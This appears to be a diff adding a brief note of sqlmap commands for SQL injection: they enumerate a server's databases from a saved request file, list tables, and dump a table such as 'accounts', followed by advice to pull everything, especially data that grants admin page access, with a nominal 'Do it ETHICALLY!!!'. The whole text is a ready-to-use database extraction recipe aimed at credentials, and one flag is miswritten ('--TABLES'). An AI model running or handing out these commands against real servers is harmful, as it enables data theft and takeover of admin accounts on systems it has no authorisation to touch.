@@ -1,0 +1,5 @@
+sqlmap -r (/directory/where/you/save/txt/file) --dbs
+sqlmap -r (/directory/where/you/save/txt/file) -D (name of the directory of the database of the server, for example: users) --TABLES
+sqlmap -r (/directory/where/you/save/txt/file) -D users -T (Directory inside the users for example: accounts) --dump
+
+Scan everything inside in the database specially those information who can access the admin page. Do it ETHICALLY!!!
